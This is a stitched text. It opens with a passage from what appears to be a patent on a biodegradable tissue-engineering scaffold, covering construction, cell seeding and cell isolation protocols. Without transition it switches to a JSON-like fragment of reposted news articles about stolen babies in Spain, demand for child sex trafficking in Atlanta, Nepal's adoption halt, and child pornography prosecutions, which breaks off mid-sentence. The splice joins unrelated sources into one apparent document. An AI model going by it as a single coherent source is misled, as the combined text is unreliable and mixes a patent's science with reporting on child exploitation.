invention remedy the above-stated problems. Because the scaffold can have multiple scaffold layers with A-strips that promote cell-attachment, and because the separating layers and S-strips can be designed to have specific pore sizes, homogeneous or even cell distribution within the scaffold is greatly improved over prior scaffolds. Additionally, the size is not as limited as prior constructs with the present scaffolds because the pores within the scaffold allow for the interchange of metabolites, oxygen, and bioactive agents. Further, in a preferred embodiment, the scaffolds of the invention are made of completely biodegradable materials that allow the scaffold to be re-shaped and readily adopted into the surrounding tissue in which it is implanted.\nThe present invention also provides a method of producing a semi-solid, three-dimensional, biocompatible scaffold by layering one or more sheets of biocompatible A-strip material by a fixed distance from each other; cutting the sheets to provide A-strips of a fixed width, maintaining the parallel A-strips at a fixed distance from each other; and contacting the parallel A-strips with a biocompatible S-strip material under conditions to fill the space separating the A-strips within a layer and between layers to form a semi-solid, three-dimensional, biocompatible and, preferably, biodegradable scaffold. This method of producing the scaffold is preferred when the source material for producing A-strips is available in sheets, for example, submucosa. Biocompatible materials such as polyglycolic acid, polylactic acid, their copolymers, poly(epsilon-caprolactone), polyhydroxybutyrate, polyester copolymers, polycarbonates, polyacrylates, polyanhydrides, polyorthoesters can be formed into sheets, for example, by the methods reported in U.S. Pat. No. 5,723,508. A-strips can comprise synthetic materials which may be combined with a factor that encourages cell attachment.\nAlternatively, when the source material for producing A-strips is not available in sheets, a method of producing a semi-solid, three-dimensional, biocompatible scaffold is provided. For example, extracellular matrix gels and liquid matrices (including fluidized submucosa) can be placed (for example, by micro-pipette) onto or into gelatinous layers of alginate to form A-strips according to the appropriate dimensions stated herein, thereby forming a scaffold layer. Also, proteins or peptides (for example, integrins, collagen, laminin, fibronectin, vitronectin, or RGD peptides) that promote cell attachment can be patterned as A-strips onto gelatinous layers of alginate, thereby forming a scaffold layer. These scaffold layers can be sandwiched between layers of alginate (i.e., separating layers) to form a three dimensional scaffold. This method provides an alternative strategy to producing scaffolds with A-strips of cell-adhesive material obtained from non-reconstituted submucosa.\nFor scaffolds of the invention and the methods of producing those scaffolds, the overall dimensions of the sheet are determined by the intended uses of the scaffold. Scaffolds can be produced that are larger for an area of intended implantation. For manufacturing purposes, it is preferable to produce large scaffolds from which smaller scaffolds can be obtained.\nWhen the cell-adhesive material is in the form of a sheet, the sheet can be coated with one or more of the bioactive agents previously described. When the cell-adhesive material is originally in the form of a liquid, liquid matrix, or gel, one or more bioactive agents can be mixed with the cell-adhesive material prior to forming the strips. In addition, if desired, A-strips of any material can be coated with a physiological solution comprising one or more bioactive agents. Similarly, the S-strips and the separating layers can be coated and/or mixed with one or more bioactive agents.\nIt is to be understood and expected that variations in the principles of the invention herein disclosed in an exemplary embodiment can be made by one skilled in the art and it is intended that such modifications, changes, and substitutions are included within the scope of the present invention.\nThe examples set forth below illustrate several embodiments of the invention. These examples are for illustrative purposes only, and are not meant to be limiting.\nThe instruments used in this example are pictured in FIG. 1.\nA porcine small-intestine submucosa (SIS) sheet is obtained (vivoSIS\u2122 cell culture disk, Cook Biotech). The disk has a diameter of 12 millimeters and a nominal thickness of 115 micrometers. The disks are sterile, acellular, and endotoxin free.\nThe disks are rehydrated with at least two changes of phosphate buffered saline (PBS) pH 7.4. Upon rehydration, the disks become pliable and easily fold upon themselves. The disks are cut into squares and clamped in layers as shown in FIG. 1A at a fixed distance between layers of about 100 micrometers.\nA comb of knives is inserted at one end while another comb of spacers follows the knives. The distances between each knife in the comb of knives are set at a fixed distance of about 30 micrometers. The distance between each spacer in the comb of spacers are set at a fixed distance of about 100 micrometers (width). As the comb of knives cuts through the sheets, the spacers hold the formed strips (A-strips) of submucosal tissue apart (see FIG. 1B). The comb of knives is removed, and the combs of spacers at each end are maintained in place to keep the A-strips separated.\nThe clamped and spaced A-strips are placed into a mold filled with a 5% sodium alginate solution to submerge the A-strips. After the alginate has sufficiently infiltrated the A-strips, 60 mM calcium chloride solution is added to cross-link the alginate and the A-strips into a semi-solid block. After formation of the semi-solid block, the clamps and the combs of spacers are removed to produce a semi-solid, three dimensional, biocompatible and biodegradable scaffold. Thus, in this example, the alginate that solidifies between the A-strips constitutes the S-strips, and the alginate that solidifies between the A-strip/S-strip layers (scaffold layers) constitutes the separating layers.\nThe scaffold according to Example 1 is seeded with any cell-type (or combinations of) in vitro. A scaffold is placed in a tissue culture dish or bioreactor with a serum-containing culture medium appropriate for the cells intended for seeding. Generally, cells at a concentration of 1-5\u00d7106 cells/ml are added to the dish or bioreactor and incubated for 24-72 hours at 37\u00b0 C. at 5% CO2.\nFor example, embryonic stem cell-derived cardiomyocytes are incubated with a scaffold that is 5 millimeters thick (25 layers) and 2 centimeters square with 106 cells in 25 ml of culture medium. This incubation occurs under shaking at 50 rpm at 37\u00b0 C. at 5% CO2 for 48 hours. This seeded-scaffold is further cultured in media for ten additional days to allow cell spreading.\nWhen bioreactors are used for seeding cells onto scaffolds, some examples are: flasks (static or mixed at 50 or 90 rpm) (Bellco, Vineland, N. J.), 6-well dishes mounted on an xyz gyrator operated at 24 rpm (Shelton, Shelton, Conn.), or two types of rotating bioreactors: the high aspect ratio vessel (HARV) and the slow turning lateral vessel (STLV), both from Synthecon (Houston, Tex.). The mixing properties of these bioreactors are described in Freed, L. E. et al., \"Cultivation of cell-polymer tissue constructs in simulated microgravity,\" Biotechnol. Bioeng., 1995, 46:306-313; Freed, L. E. et al., \"Culture of organized cell communities,\" Adv. Drug. Deliv. Rev., 1998, 33:15-30; Freed, L. E. et al., \"Microgravity tissue engineering,\" In Vitro Cell Dev. Biol. Anim., 1997, 33:381-385; Freed, L. E. et al., \"Tissue culture bioreactors: Chondrogenesis as a model system,\" Principles of tissue engineering, 1997, Editors: Langer and Chick, Austin, Tex., pages 151-165; and Vunjak-Novakovic, G. et al., \"Effects of mixing on the composition and morphology of tissue engineered cartilage,\" J. Am. Inst. Chem. Eng., 1996, 42:850-860. Brief protocols for seeding cells onto scaffolds are below, in these protocols, the size of the scaffold is 10-mm by 10-mm (wherein each layer is 10-mm by 10-mm in surface area) by 2-mm (thickness).\nFor seeding in mixed flasks, scaffolds are pre-wetted with culture medium, threaded onto 4-inch long pieces of stainless steel wire, and positioned using 3-mm long segments of silicone tubing. The wires (up to 4 per flask with 1-2 scaffolds apiece) are embedded into a 5-cm diameter silicone stopper which are placed in the mouth of the flask (6.5-cm diameter, 120 mL volume). Gas exchange occurs via surface aeration. Mixed flasks are stirred at 50 rpm using a 4-cm long, 0.8 cm diameter non-suspended stir bar in a humidified, 5% CO2/37\u00b0 C. incubator. After 24 hours, mixed flasks are inoculated with a suspension of cells (1.3-8\u00d7106 cells/scaffold), and cells are allowed to attach to scaffolds for three days.\nFor seeding using the xyz gyrator, scaffolds are pre-wetted for 24 hours with medium and inoculated for two hours with a concentrated cell suspension (1 mL containing 8\u00d7106 cells) in 6-well dishes (one scaffold per well) mounted on the xyz generator. Scaffolds are then transferred into mixed flasks (4 needles with 2 scaffolds apiece per flask stirred at 50 rpm) and allowed to seed with the remaining cell suspension from the 6-well dishes for three days.\nThe culturing space of the HARV is a cylinder with a diameter of 10 cm, a thickness of 1.3 cm, a total volume of 100 mL, and a gas exchange membrane area of 0.8 cm2/cm3 medium. The HARV is mounted on a base that provides vessel rotation about its central axis and incubator air is pumped over the silicone membrane over gas exchange. Mixing is provided by fluid flow around the scaffolds. For seeding in HARVs, eight scaffolds per vessel are pre-wetted with medium for 24 hours and inoculated with a cell suspension (6 or 8\u00d7106 cells per scaffold). Cells are allowed to attach for three days. During seeding and cultivation, the vessel rotation speed is set at 11-12 rpm in order to maintain constructs freely suspended within the vessel.\nThe culturing space of the STLV consists of the annular space between two concentric cylinders with diameters of 5.75 and 2 cm. It has a total volume of 110 mL and a gas exchange membrane area of 0.3 cm2/cm3. Like the HARV, the STLV is mounted on a base that allows vessel rotation (11-12 rpm) and gas exchange. Seeding and cultivation in the STLV is similar to that described for the HARV.\nFor all the above-methods, medium composition is maintained by regular replacement (same rate in all groups, 50% every other day) and gas exchange between medium and 5% CO2 humidified incubator air maintained at 37\u00b0 C.\nExamples of isolating certain cell-types are shown below.\nAs an example of pre-clinical testing of the scaffold, animal testing can be conducted. For example, the scaffold can be seeded with fetal rat cardiomyocytes. Fetal rat cardiomyocytes are isolated using an enzymatic digestion method (Li, R. K. et al., \"Cardiomyocytes transplantation improves heart function,\" Annals of Thoracic Surgery, 1996, 62:654-661; Li, R. K. et al., \"In vivo survival and function of transplanted rat cardiomyocytes,\" Circulation Research, 1996, 78:283-288) from 18-day gestational Sprague-Dawley rat heart ventricles (Charles River Canada Inc. Quebec, Canada). Fetal rats are anesthetized with intraperitoneal injection of sodium pentobarbital (30 mg/kg) and the hearts are then excised. The heart tissues are washed with PBS (136.9 mM NaCl, 2.7 mM KCl, 8.1 mM Na2 HPO4, KH2 PO4, 1.5 mM pH 7.3). The tissues are minced and incubated in 10 mL PBS containing 0.2% trypsin, 0.1% collagenase, and 0.02% glucose for 30 minutes at 37\u00b0 C. Repetitive pipetting of the digested myocardial tissue then isolates the cardiomyocytes. The cells in the supernatant are transferred into a tube containing 20 ml of cell culture medium (Iscove's modified Dulbecco's medium containing 10% fetal bovine serum, 0.1 mmole/L \u03b2-mercaptoethanol, 100 units/ml penicillin and 100 \u03bcg/ml streptomycin). The tube is centrifuged at 600\u00d7g for 5 minutes at room temperature and the cell pellet is resuspended in the cell culture medium for purification.\nAdult ventricular cardiomyocytes can also be used to seed the scaffold. Adult rats (Charles River Canada Inc. Quebec, Canada) are anesthetized by intramuscular administration of ketamine hydrochloride (22 mg/kg body weight) followed by an intraperitoneal injection of sodium pentobarbital (30 mg/kg) and the hearts are then excised. Cardiomyocytes are isolated by enzymatic digestion as described above. Adult human ventricular biopsies are similarly enzymatically digested.\nAdult atrial cardiomyocytes can be used to seed the scaffold. Rats (Charles River Canada Inc. Quebec, Canada) are anesthetized similarly as above. The atrial appendages are ligated and removed. The atrial tissue is used for cardiomyocyte isolation as described above. Adult human atrial tissue is obtained and similarly enzymatically digested.\nSmooth Muscle Cells: Fetal rat cardiomyocytes are isolated using an enzymatic digestion method (Li, R. K. et al., \"Cardiomyocytes transplantation improves heart function,\" Annals of Thoracic Surgery, 1996, 62:654-661; Li, R. K. et al., \"In vivo survival and function of transplanted rat cardiomyocytes,\" Circulation Research, 1996, 78:283-288) from 18-day gestational Sprague-Dawley rat heart ventricles (Charles River Canada Inc. Quebec, Canada). Fetal rats are anesthetized with pentobarbital (30 mg/kg body weight, intraperitoneal) and the stomachs are then excised. The stomachs are washed with PBS. The stomachs are minced and incubated in 10 ml PBS containing 0.2% trypsin, 0.1% collagenase, and 0.02% glucose for 30 minutes at 37\u00b0 C. The smooth muscle cells are isolated by repetitive pipetting of the digested myocardial tissue. The cells in the supernatant are transferred into a tube containing 20 ml of cell culture medium (199 medium containing 20% fetal bovine serum, 100 unites/ml penicillin and 100 ng/ml streptomycin). The tube is centrifuged at 600\u00d7g for 5 minutes at room temperature and the cell pellet is resuspended in the cell culture medium and cultured.\nAdult Smooth Muscle Cells. Adult female rats (Charles River Canada Inc. Quebec, Canada) are anesthetized as described supra. The uterus is removed after occlusion of blood vessels and incisions are closed. The smooth muscle cells are isolated from uterus as described in the paragraph above.\nFetal Fibroblasts. Fetal rat skin biopsies are obtained from 18-day gestational Sprague-Dawley rats. The rats are anesthetized, and fibroblasts from fetal rat skin are isolated, purified and cultured (Mickle, D. A. G. et al., \"Water-soluble antioxidant specificity against free radical injury using cultured human ventricular myocytes and fibroblasts and saphenous vein endothelial cells,\" Journal of Molecular and Cell Cardiology, 1990, 22:1297-1304). Briefly, the tissue is washed with PBS and minced. The tissue is then digested with in 10 ml phosphate buffered saline containing 0.2% trypsin, 0.1% collagenase, and 0.02% glucose for 30 minutes at 37\u00b0 C. The fibroblasts are isolated by repetitive pipetting of the digested myocardial tissue. The cells in the supernatant are transferred into a tube containing 20 ml of cell culture medium (Dulbecco's Modified Essential Medium containing 10% fetal bovine serum, 100 units/ml penicillin and 100 ug/ml streptomycin). The tube is centrifuged at 600\u00d7g for 5 minutes at room temperature and the cell pellet is resuspended in the cell culture medium and cultured.\nAdult Fibroblasts. Skin biopsies are obtained from adult Sprague-Dawley rats. The fibroblasts are isolated and cultured as described supra.\nAdult Endothelial Cells. Adult rat vascular endothelial cells were isolated using an enzymatic digestion method (Mickle et al. 1990) from Sprague-Dawley rat aorta (Charles River Canada Inc. Quebec, Canada). Adult rats are anesthetized as described supra. The aorta is then excised, washed with PBS and incubated in 10 ml PBS containing 0.2% trypsin, 0.1% collagenase, and 0.02% glucose for 30 minutes at 37\u00b0 C. The blood vessel is washed with cell culture medium (199 medium containing 20% fetal bovine serum, 100 units/ml penicillin and 100 ug/ml streptomycin). The endothelial cells are cultured.\nHuman cardiomyocytes are isolated from atrial appendages and ventricular myocardial biopsies obtained from patients undergoing corrective cardiac surgery. Human myocardium is dissected to remove connective tissue and then minced to pieces less than 1 mm in size. Protocols for culturing are below.\nHuman Pediatric Cardiomyocytes. Pediatric tissue is digested in an enzymatic digestion solution containing 0.2% trypsin, 0.1% collagenase dissolved in PBS for 15 minutes. No calcium or EDTA was added. Culture medium containing Iscove's modified Dulbecco's medium (IMDM), 10% fetal bovine serum and 0.1 mM \u03b2-mercaptoethanol is added in a ratio of 20 volumes culture medium to 1 volume enzymatic digestion solution. The solution is centrifuged at 581 g for 5 minutes. The supernatant is discarded. The cell and tissue pellet is resuspended in culture medium. The isolated cells are cultured on a dish for 5 to 8 days. Cardiomyocytes that migrate from this culture are collected by a Pasteur pipette and cultured with a scaffold.\nHuman Adult Cardiomyocytes. Different from pediatric tissue digestion, adult human myocardium is digested twice. The second digestion is necessary for the adult tissue due to the increased amount of connective tissue. After the tissue is digested as described above, the solution containing suspended cells is collected. The remaining tissue is incubated with the enzymatic solution for a second time for 10 minutes and the cell suspension is collected. The two collected suspensions are combined. After centrifugation, the cell pellet is resuspended and cultured. The digested tissue fragments in the pellet are collected and cultured for no longer than 2 days (to avoid cell deterioration) and a further enzymatic digestion carried out on the remaining undigested tissue if sufficient cells are not found in the suspensions. Cardiomyocytes are found to grow from the cultured tissue fragments. The cells are isolated and then cultured with the scaffold.\nIsolated cells can be cultured with the scaffold immediately or after growth in culture. If isolated cells are to be expanded prior to culturing with a scaffold, then the cells need to be passaged in culture. The cardiomyocytes are cultured in a medium containing IMDM, 10% fetal bovine serum and 0.1 mM \u03b2-mercaptoethanol. The cells are subcultured when the culture reaches confluence (i.e., when the cell culture covers the dish surface and the cells begin contacting each other). If the cells are subcultured before reaching confluency, the cells would undergo de-differentiation quickly. If the cells are allowed to become over-confluent, enzymatic digestion yields cell clumps that do not dissociate and would not divide in culture. The subculturing enzymatic solution contains 0.01% trypsin, 0.02% glucose and 0.5 mM EDTA.\nCultured cells can be stored for later incubation with scaffolds. The primary cultures of human cardiomyocytes are stored for future use in liquid nitrogen. The cultured cardiomyocytes are dissociated from the culture plate using the subculturing enzymatic digestion solution. Culture medium is added in a ratio of 5 volumes culture medium to 1 volume digestion solution. The resultant solution is centrifuged at 581 g for 5 minutes. The supernatant is removed and the cell pellet is gently re-suspended in 1 mL IMDM containing 20% fetal bovine serum and 20% glycerol. The solution is transferred to a sterile cryo-vial in a Nalgene freezing container containing isopropranol in its base. The container is stored in a \u22128\u00b0 C. freezer container for a period of time that: (a) ensures that the cells reached \u221280\u00b0 C.; and (b) prevents over oxidation of the cells. In the present example, the container containing the solution is stored for a minimum of 4 hours and no longer than 8 hours. The long term storage of the cryo-vials containing the cells is in liquid nitrogen.\nWhen the stored cells are to be cultured, the vial is removed from liquid nitrogen and warmed at 37\u00b0 C. Although 37\u00b0 C. is found to be preferred, thawing of the cells can take place at other temperatures that allow for rapid yet non-destructive warming. The initial plating of the cells is done in 10 mL of IMDM medium containing 20% fetal bovine serum. The cells are kept in this warming medium for 3 to 5 days to allow the cells to attach firmly to the culture dish before switching to the usual culture medium. The warming medium is IMDM and 20% fetal bovine serum. The cardiomyocytes, cryo-frozen and warmed as described, are morphologically identical to cells that are not frozen and can be successfully subcultured.\nEndothelial Cells. Human vascular endothelial cells are isolated from the saphenous vein and aorta obtained from patients undergoing coronary bypass surgery. The endothelial cells are isolated as described for rat endothelial cells.\nSmooth Muscle Cells. Human smooth muscle cells are isolated from the saphenous vein after endothelial cell isolation. The remaining tissue is minced and incubated in 10 ml PBS containing 0.2% trypsin, 0.1% collagenase, and 0.02% glucose for 30 minutes at 37\u00b0 C. Repetitive pipetting of the digested tissue isolates the smooth muscle cells. The cells in the supernatant are transferred into a tube containing 20 ml of cell culture medium (199 medium containing 20% fetal bovine serum, 100 units/ml penicillin and 100 \u03bcg/ml streptomycin). The tube is centrifuged at 600\u00d7g for 5 minutes at room temperature and the cell pellet is resuspended in the cell culture medium and cultured with a scaffold.\nFibroblasts. Human fibroblasts are isolated from skin biopsies.\nCell Purification. The isolated cardiomyocytes, smooth muscle cells, and vascular endothelial cells are purified by a preplating technique (Simpson, P. et al., \"Myocyte hypertrophy in neonatal rat heart cultures and its regulation by serum and by catecholamines,\" Circulation Research, 1982, 51:787-801), which takes advantage of the finding that these cells require a longer time to attach to a cell culture dish than fibroblast cells. The freshly isolated cells are plated on dishes and cultured for 2 hours at 37\u00b0 C. The supernatant containing the suspended cells are transferred into another dish for further culturing with or without a scaffold.\nAnother technique for cell purification is the clonal dilution technique. When the cells are seeded at low density for culturing, vial cells form individual colonies. Undesired cell types adjacent to a colony of interest can be necrosed with a sterile needle. Colonies are picked using a sterile pasteur pipette and transferred to new culture dishes for culturing and passaging.\nThe purity of cultured cardiomyocytes is assessed by immunofluorescent staining for cardiac myosin heavy chain ((Li, R. K. et al., \"Cardiomyocytes transplantation improves heart function,\" Annals of Thoracic Surgery, 1996, 62:654-661; Li, R. K. et al., \"In vivo survival and function of transplanted rat cardiomyocytes,\" Circulation Research, 1996, 78:283-288)). The cultured cells are fixed with methanol at \u221220\u00b0 C. for 15 minutes, washed with PBS, incubated with a monoclonal antibody against MHC for 45 minutes at 37\u00b0 C., washed three times with PBS for 5 minutes each at room temperature, and then under humid and dark conditions incubated with rabbit anti-mouse IgG conjugated with fluorescein isothiocyanate for 45 minutes at 37\u00b0 C. The cells are washed with PBS, mounted and photographed using a light and UV microscope. The cardiomyocyte purity is determined by counting the percentage of stained cells in 8 random fields/dish.\nThe purity of smooth muscle cell culture is determined by immunofluorescent staining for \u03b1-smooth muscle cell actin (Sigma). The purity of endothelial cell culture is determined by immunofluorescent staining for factor VII. The purity of fibroblast cell culture is determined morphologically by microscopic examination.\nTo test the scaffolds of the present invention for the ability to promote cell differentiation and growth, a variety of methods are known in the art and can be used. The methods vary relative to the cell seeded in the scaffold, either in vitro or in vivo. This example provides some methods that can be used to test the scaffold's ability to promote cell growth and differentiation for cardiac tissue using cardiomyocyte cells isolated from heart tissue seeded onto scaffolds according to Example 1.\nFor in vitro scaffolds, medium samples (1 mL) are taken at the end of the seeding period (see Example 2) and every two days during cultivation. pH and partial pressures of oxygen (\u03c1-O2) and carbon dioxide (\u03c1-CO2) are measured immediately after sampling using a gas blood analyzer (Model 1610, Instrumentation Laboratory, Lexington, Mass.) with an accuracy of 0.1% for pH and 2% for \u03c1-O2 and \u03c1-CO2. Cell death and damage during seeding and cultivation are assessed by measuring lactate dehydrogenase (LDH) levels in the supernatant of centrifuged samples of media using a commercial kit (Chiron, East Walpole, Mass.). Concentrations of glucose and lactate in the media are measured using a glucose and L-lactate analyzer (Model 2300 STAT Plus, YSI, Yellow Springs, Ohio).\nScaffold structure is analyzed using light and transmission electron microscopy (TEM). Scaffolds that are taken (either from in vitro cultures or from animals after implantation) for histological analysis are rinsed in PBS, fixed for 10 minutes in 4% glutaraldehyde, incubated for 24 hours in neutral buffered formalin, embedded in paraffin, and cross-sectioned (5 micrometers thick) through the center of the scaffold. Sections are stained with hematoxylin and eosin (H&E) for cells and immunohistochemically for cellular expression of sarcomeric \u03b1-actin, muscle desmin, cardiac myosin, cardiac troponin-T, and sarcomeric tropomyosin. Scaffold samples for TEM are fixed in Kamovsky's reagent (0.1 M sodium cacodylate with 2% paraformaldehyde and 2.5% glutaraldehyde, pH 7.4), postfixed in 2% osmium tetroxide, dehydrated in ethanol/propylene oxide, embedded in Poly/Bed812 (Polysciences, Warrington, Pa.), and sectioned (60 nm thick). Sections are stained with lead citrate and uranyl acetate and examined with a transmission electron microscope (JEOL-100CX, JEOL, Peabody, Mass.).\nThe proper differentiation of cardiac myocytes is assessed by immunohistochemical labeling of muscle specific desmin, muscle specific myosin, cardiac specific troponin-T, and sarcomeric muscle specific tropomyosin. Transmission electron micrographs assess whether the cells have compact mitochondria and myofilaments organized with clearly defined sarcomeres and z lines, as expected for native cardiac muscle cells. The micrographs also show whether intercellular desmosome-like junctions have formed between adjacent cardiac myocytes. To observe whether the cells in the scaffolds contract, videomicroscopy or the unaided eye is able to observe spontaneous and synchronous contractions.\nA scaffold with randomly-oriented scaffolding layers can be used to regenerate skin. The scaffold implanted at a site of skin damage without cells. Alternatively, the scaffold is seeded in vitro with fibroblasts and keratinocytes and cultured for the appropriate time before implantation.\nFibroblasts and keratinocytes are two skin cell-types that depend on one another for the proper nutrients, differentiation signals, and production and maintenance of the surrounding extracellular matrix. Keratinocytes and fibroblasts can be isolated from the same skin biopsy. As in Example 2, fibroblasts and keratinocytes are added to cultures containing the scaffolds. A method of producing primary culture keratinocytes from skin biopsies is described in U.S. Pat. No. 5,834,312, Examples 1 and 2, column 10, line 42 to column 14, line 67.\n1.

{"text": "Spain seeks truth on baby-trafficking claims\nThe tearful stories swapped outside the Spanish attorney general's office today were of nuns, priests and doctors trafficking in babies, of tiny corpses kept in fridges, of coffins without bodies and of mothers who only caught one fleeting glimpse of their newborn children.\n\"My baby is not registered as having been born, died or even as being stillborn. She simply does not exist, but I heard her cry,\" said Ana P\u00e1ez, 51. She was one of 261 mothers, fathers, siblings and adoptees demanding that authorities investigate whether they were victims of a baby-stealing network in Spanish hospitals.\nP\u00e1ez travelled from Barcelona today to add the daughter she says was born in 1981 at the Vall d'Hebron hospital to the other cases that campaigners want investigated by the courts.\n\"I want to know where she is,\" she said. \"I have cried for her often and I want her to know that I didn't give her away, that she was stolen. Now I know I am not the only one.\"\nAdela Alonso, 70, said: \"The same thing happened to me in Valladolid in 1967. I heard that baby cry, but two days later they said he was dead and had buried him.\n\"I want him to know that he has two brothers and lots of cousins.\"\nWhile most had no proof that their children were stolen, their stories had one thing in common \u2013 the absolute power exercised by maternity hospitals over their patients, especially poorer ones, for decades.\nThe fact that hospitals were responsible for burying children who died at childbirth meant the number of potentially suspicious cases was huge. In some cases the paperwork is missing.\n\"We were told that there is no register, that our case simply does not exist,\" said Antonio Moreno, who was searching for a sister born at a clinic in Terrassa, near Barcelona, in 1967.\nClandestine networks that once encouraged single women to hand their babies over for secret adoptions by respectable families in a mostly Roman Catholic country have added further confusion to past events.\nIn those cases, births were sometimes registered fraudulently as being born to the adoptive mother. Lax adoption laws were not changed until 1987.\nA Madrid clinic that closed in the 1980s after being investigated for its role in illegal adoptions, the Clinica San Ram\u00f3n, is at the centre of the allegations. Journalists found a baby's corpse in a fridge, leading to rumours that bodies were kept to show parents who doubted their own child had died. A former clinic employee recently confirmed that babies were illegally given up for adoption.\nA group of people born at the San Ram\u00f3n and adopted by families from the Valencia region are among those now seeking their biological parents.\n\"The stolen children are looking for their parents and the mothers for their children,\" said Enrique Vila, the lawyer representing them.\nRevelations that, in its early days, Franco's regime also removed children from new mothers deemed to be dangerously leftwing have added to mistrust of the medical system.\nCampaigners insisted today that while the theft of babies may have originated in the early days of Franco, it had proved so lucrative that it continued after the dictator died.\nEstefania Anguita, 24, wanted to know what happened to her twin sister, Amanda, born at La Alianza clinic in Barcelona in 1986.\n\"We were both born healthy, but two hours later they said she had died. The hospital said it buried her. There are five more cases from the same hospital.\"\nAntonio Barroso, an adoptee who is leading the campaign, said: \"If they refuse to accept the case then we will go to the European court of human rights at Strasbourg, because we are not going to stop.\"\nPosted on January 31, 2011 by Florida Coalition Against Human Trafficking\tin Human Trafficking 101\t\u2022 Leave a comment\nStudy explores 'demand' for trafficking of children in Atlanta\nATLANTA, GA (WABE) \u2013 The principle that Supply and Demand drives commercial business can also be applied to the commercial sexual exploitation of children- or trafficking. To stop the supply,' we need to address the demand, say advocates like Deborah Richardson, Chief Program officer for the Women's Funding Network.\n\"The number of girls that are being exploited continues to increase \u2013 and the reason that continues to happen is because the demand for buying young girls in this country, very little attention is paid to it. And the internet has provided the anonymity and access to these girls like never before.\"\nThe internet, according to studies by the Atlanta-based Schapiro Group, is the predominant marketplace for purchasing sex from young girls.\nCommissioned by the Atlanta advocacy group, A future Not a Past, the Schapiro group also conducted a Demand study' last fall, to get a better understanding who the johns' are and where they're coming from.\n\"We posted ads on a few different websites posing as a fake escort agency.\"\nRusty Parker is senior strategist.\n\"The ads would say 'call us tonight' a phone number and picture of a girl who might look young.\"\nWhen men called in, he says, operators' would survey them without their knowledge. From 218 usable surveys, they found the calls came from men ALL over metro Atlanta, and the average age was less than 40. And while many may not have been trolling for child prostitutes per say, more than half were willing to purchase sex from an adolescent girl.\nAgain Rusty Parker.\n\"We had a protocol in place to offer the 'johns' 3 opportunities to back out, this girl was under 18, she told me she's 18 but i question that, things like that. we measured to see how many of these guys backed out after these warnings.\"\nAfter all three warnings says Parker, \"We found that just about 50% say yes, that's ok with me, send that girl over.\"\nNo transactions were carried out.\nWhile the demand study may represent a small piece of a huge pie, it's one of very few studies out there. And advocates and sociologists like Carrie Baker, an associate professor at Berry College, believe it shows how acceptable it has become in our society for men to seek out younger and younger girls for sex.\n\"Our culture creates certain things as desirable and right now it's focused on very young girls being desirable.\"\nBaker says the sexualization of girls in popular culture, makes it seem more normal for men to desire these young girls and then to act on that desire.\n\"Look at pop culture, music television, Nickelodeon and you'll see cartoons geared toward kids where female characters dress very scantily and engage in strip teases. Go to a toy store, look at Brats dolls. They're little hookers is what they are. They're very sexualized, wearing very scantily clad clothes and all they talk about is how to attract men, how to be fashionable, how to be glamorous, how to be hot.\"\nWhether it's toys, Miley Cyrus pole dancing, or teen shows like MTV's Skins with explicit content, Baker, Richardson and others agree that the sexualization of youth in our culture contributes to the demand of child sex trafficking \u2013 and it needs to be stopped.\nTo view the study, visit www.womensfundingnetwork.org\nPosted on January 31, 2011 by Florida Coalition Against Human Trafficking\tin Sex Trafficking, Video and Media\t\u2022 Leave a comment\nPainful affairs of child adoption in Nepal\nAs Dozens of Parents are Waiting for Child Adoption, the US Decision to halt Adoption and Nepal's Haphazard Way of Adoption Process have been Giving Trouble to Many Families.\nLast September, American couple Haydn Hilling and his wife Edvige desperately wanted to take home their adopted Nepali child, Kailash. Though the American couple that hails from Louisiana spent more than one-and-a-half years getting the necessary paperwork required for the adoption, the process has come to a standstill following the United States' decision to halt adoptions of abandoned children from Nepal.\nThe U.S. administration halted the adoption of Nepali children due to growing allegations of child trafficking and falsification of documents, often in connivance with government authorities.\nA joint statement issued by the U.S. Department of State and the U.S. Citizenship and Immigration Services in the first week of August said the step was taken to protect the rights and interests of Nepali children and their families after field visits to orphanages and police departments showed that documents describing children up for adoption as abandoned were often unreliable.\nAnother 10 countries\u2013Canada, Denmark, Germany, France, Norway, Sweden, Switzerland, Spain, Italy, and the United Kingdom\u2013have also halted inter-country adoptions from Nepal.\nAccording to Nepal's Ministry of Women, Children and Social Welfare, new rules were put in place last December and some stern measures have been added to the process.\n\"The Hague Secretariat also wants the smooth resumption of child adoption here,\" chief of the ministry's legal section, Sher Jung Karki said. The new set of policies allows local placement agencies to charge US$5,000 to adopting parents, while the government charges US$3,000.\nAny foreign placement agency must set up a liaison office in Nepal and pay the government US$10,000 that will be handed over to an organization working for the welfare of children. Subsequently, the process of inter-country adoption of street children is subject to widespread abuses, the government has banned the adoption effective from Jan. 5.\nThe new policy also allows Nobel laureates, heads of states/governments, foreign ministers, celebrities, or a couple with an annual income of over US$300,000 to become foster parents, while others cannot.\nLargely, a vulnerable adoption process that had been taking place in Nepal since several years has compelled the US government more alerted and posed a ban. That was the reason that they could not adopted two \u2013 year \u2013 old Kailash which made them running from pillar to post that their call will be heard.\nNow the list is long. As many as 56 American families are facing heartbreak due to the US Government decision to ban child adoption from Nepal until Nepal's legal provision ensures that adopted children were not fraud and claim genuine.\nThese desperate 56 parents have instituted an alliance and had registered a petition in US Congress. \"We respectfully request that the Right Honorable members of the US Senate and House petition the Department of State and USCIS within the Department of Homeland Security to assist the \"Nepal Pipeline families\" in obtaining visas to bring their children home immediately,\" the petition reads.\nIn response to the petition, 14,398 letters and emails were sent far to support their campaign. Moreover they have internet campaign through blog, http://theywaitnepal.blogspot.com/. One can find the photos of to be adopted Nepali child and their US mother. \"These families are struggling to bring home their legally adopted children who are stuck in Nepal awaiting visas that will allow them to enter the US,\" they write in their blog.\nMany anxious parents are waiting in the US also. Many are stranded since August, 2010.\nIt seems that child adoption in Nepal has been turned into a profitable business as dozens of websites and privately organizations have claimed that there were many advantages of adopting children from Nepal. \"There are many advantages for adopting from Nepal. Even though Nepal is an economically poor country, children are cared for very well with few incidences of abuse or neglect. If you like the idea of adopting a baby or toddler, it would be an excellent country to consider,\" claims, adoptionark.\nRead more: http://www.allheadlinenews.com/briefs/articles/90032149?Painful%20affairs%20of%20child%20adoption%20in%20Nepal#ixzz1CdLImHV9\nChild pornography prosecutors: Victims are getting younger, acts are more vile\nChild pornography isn't just more pervasive, it's getting even uglier.\nFederal prosecutors in Detroit say they have witnessed the disturbing trend with the kids getting younger \u2014 toddlers and infants as young as 6 months old \u2014 turning up in photos and videos.\nAnd the assaults are getting worse. It's not just still images of children in the nude, they say.\n\"There's a misconception in the public arena that these are mainly still images of children without clothes on. Well, the truth is that the majority of the pictures that are traded among these guys almost inevitably involve a child being either raped, or being forced 